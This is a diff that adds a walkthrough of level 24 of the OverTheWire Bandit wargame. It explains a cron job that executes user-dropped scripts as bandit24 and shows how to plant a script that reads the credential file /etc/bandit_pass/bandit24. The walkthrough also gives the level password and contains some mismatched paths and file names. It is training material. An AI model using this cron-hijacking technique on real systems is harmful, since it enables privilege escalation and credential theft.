@@ -706,3 +706,81 @@ Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ---
 
 #### Level 24
+Go over to `/etc/cron.d/` to find `cronjob_bandit24`.
+
+```
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
+```
+
+Again, navigate to the script.
+
+```bash
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+The program first sets a variable `myname` as the user that runs the cronjob, in this case bandit24.
+
+Then it navigates to the directory `/var/spool/bandit24/foo`.
+
+A for loop is run for every file in the current working directory, first checking if the file is "." or ".." which actually represents the current and parent directory respectively. If it is not, it goes ahead and prints the file name, then sets a variable `owner` as the name of the owner of the file. If the owner is "bandit23", it then executes the file after waiting 60 seconds. Finally, it deletes the file.
+
+Given this information, you could create a script that does something similar to the previous level, read the contents of the password file in `/etc/bandit_pass_bandit24` and output it to a file that you can access.
+
+First, create a temporary directory and navigate to it.
+
+```bash
+bandit23@bandit:~$ mktemp -d
+/tmp/tmp.xvOO8geGkn
+bandit23@bandit:~$ cd /tmp/tmp.xvOO8geGkn
+bandit23@bandit:/tmp/tmp.xvOO8geGkn$ nano bandit24_password
+```
+
+Next, use a text editor like Nano or Vim to create a new file for the script.
+
+```bash
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+touch /tmp/tmp.1zwgRTjGlP/$password
+```
+
+Once you have saved the file using `CTRL+X` and `Y`, you need to change the permissions of the script and the tmp folder to ensure that when the cronjob is run, the script will be able to be executed, and can access the tmp folder to create the password file.
+
+```bash
+bandit23@bandit:/tmp/tmp.xvOO8geGkn$ chmod 777 /tmp/tmp.xvOO8geGkn
+bandit23@bandit:/tmp/tmp.xvOO8geGkn$ chmod +rx bandit24_password
+```
+
+The last thing is to copy the `bandit24_password` file into the directory `/var/spool/bandit24/foo`.
+
+`cp bandit24_password.sh /var/spool/bandit24/foo/bandit24_password.sh`
+
+Wait approximately 60 seconds, then list the files in the current working directory. You should see a new file with the name of the password for the next level.
+
+> Note that if the script is not working and the password file remains empty after following this process, try changing the script to this:
+>
+> `mkdir -p /tmp/tmp.xvOO8geGkn/$(cat /etc/bandit_pass/bandit24)`
+>
+> Courtesy of user [liviuspiroiu](https://github.com/liviuspiroiu) from [here](https://mayadevbe.me/posts/overthewire/bandit/level24/).
+
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+#### Level 25
